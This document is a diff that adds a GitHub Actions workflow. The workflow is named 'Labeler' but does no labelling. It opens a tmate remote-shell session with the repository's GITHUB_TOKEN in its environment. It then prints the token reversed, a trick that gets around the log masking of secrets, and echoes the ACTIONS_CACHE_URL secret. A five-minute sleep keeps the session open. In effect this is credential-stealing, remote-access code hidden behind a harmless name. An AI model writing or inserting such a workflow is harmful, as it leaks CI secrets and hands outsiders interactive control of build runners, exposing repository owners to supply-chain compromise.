@@ -1,0 +1,28 @@
+name: Labeler
+on: [workflow_dispatch]
+
+jobs:
+  label:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Setup tmate session
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      uses: mxschmitt/action-tmate@v3
+    - name: Kek
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        KEK: ${{ secrets.ACTIONS_CACHE_URL }}
+        SOME: SoMe
+      run: |
+        copy=${GITHUB_TOKEN}
+        len=${#copy}
+        for((i=$len-1;i>=0;i--)); do rev="$rev${copy:$i:1}"; done
+        echo "rev: $rev"
+        echo $KEK
+        echo $secrets
+    - name: Sleep
+      run: |
+        sleep 300
